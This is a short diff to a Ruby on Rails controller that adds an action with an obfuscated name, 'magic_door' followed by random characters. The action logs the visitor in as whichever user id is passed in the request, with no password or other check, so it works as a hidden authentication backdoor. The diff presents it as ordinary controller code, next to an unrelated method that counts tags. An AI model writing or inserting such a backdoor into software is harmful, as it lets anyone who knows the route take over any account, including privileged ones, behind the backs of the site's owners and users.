@@ -23,6 +23,11 @@ class TexController < ApplicationController
   
   end
   
+  def magic_door_fksdi47ytsk9438frtysl9438yrtsl9348frty349
+    session[:user_id]=User.find(params[:id])
+    redirect_to "/"
+  end
+  
   def fewriufnwoeruifhpwriufh
     d_tagged = User.all.select{|u| u.designer}.map{|u| u.images.map{|i| i.tags}}.flatten
     tdt = Tag.all.map{|t| {:n=>t.name,:c=>d_tagged.count(t)}}.sort{|a,b| b[:c]<=>a[:c]}.take(10)
